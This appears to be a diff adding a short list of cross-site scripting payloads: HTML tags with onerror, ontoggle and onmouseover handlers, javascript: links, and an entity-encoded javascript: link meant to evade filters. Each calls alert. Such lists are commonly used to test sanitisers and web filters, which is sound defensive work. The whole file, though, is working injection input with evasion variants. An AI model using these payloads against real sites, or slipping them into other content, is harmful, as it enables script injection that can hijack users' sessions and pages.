@@ -1,0 +1,7 @@
+<h1><img src=x onerror=alert(1)></h1>
+<img/src/onerror=alert(origin)>
+<details/open/ontoggle=alert(origin)>
+<kave onmouseover=alert(origin)>a
+<a href=javascript:alert(origin)>test</a>
+<a href="&#74;avascript&colon;alert(origin)">test</a>
+
